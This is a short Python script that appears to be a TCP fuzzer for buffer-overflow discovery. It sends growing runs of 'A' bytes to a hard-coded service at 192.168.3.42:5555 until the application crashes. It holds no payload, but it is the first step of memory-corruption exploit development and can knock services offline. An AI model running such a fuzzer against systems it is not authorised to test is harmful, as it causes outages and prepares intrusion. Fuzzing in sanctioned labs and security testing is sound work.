#!/usr/bin/env python3

import sys
import socket
import time

TARGET_IP = "192.168.3.42"
TARGET_PORT = 5555

BUFFER_MAX = 5000
BUFFER_INTERVAL = 10

def fuzz(k, buffer_len):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((TARGET_IP, TARGET_PORT))

    print("[%s] Sending %s bytes..." % (k + 1, buffer_len))

    server_message = client_socket.recv(8192)  # Delete this if the Client is the first to send the packet
    print("[%s] [SERVER] OK" % k)              #

    client_message = b"A" * buffer_len
    client_socket.send(client_message)
    print("[%s] [CLIENT] OK" % k)

    server_message = client_socket.recv(8192)
    print("[%s] [SERVER] OK" % k)

    client_socket.close()


for k, buffer_len in enumerate(range(0, BUFFER_MAX + 1, BUFFER_INTERVAL)):
    try:
        fuzz(k, buffer_len)
    except:
        print("Error, maybe the app crashed.")
